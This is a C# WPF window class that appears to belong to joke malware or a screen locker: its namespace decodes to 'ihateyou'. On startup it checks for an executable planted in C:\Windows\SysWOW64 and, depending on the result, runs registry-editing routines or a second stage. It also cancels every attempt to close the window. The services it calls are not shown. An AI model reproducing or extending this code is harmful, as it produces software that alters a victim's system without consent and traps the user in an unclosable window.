using System;
using System.IO;
using System.Windows;

namespace _6968617465796f750d0a.Interface
{
    public partial class MainWindow : Window
    {

        private Services.Regedit.Implementions impl = new Services.Regedit.Implementions();
        private Services.RunSecond second = new Services.RunSecond();

        public MainWindow()
        {
            InitializeComponent();
        }

        private void Window_Initialized(object sender, EventArgs e)
        {
            if (!File.Exists(@"C:\Windows\SysWOW64\6968617465796f750d0a.exe")) impl.ExecuteAll();
            else second.Execute(this);
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
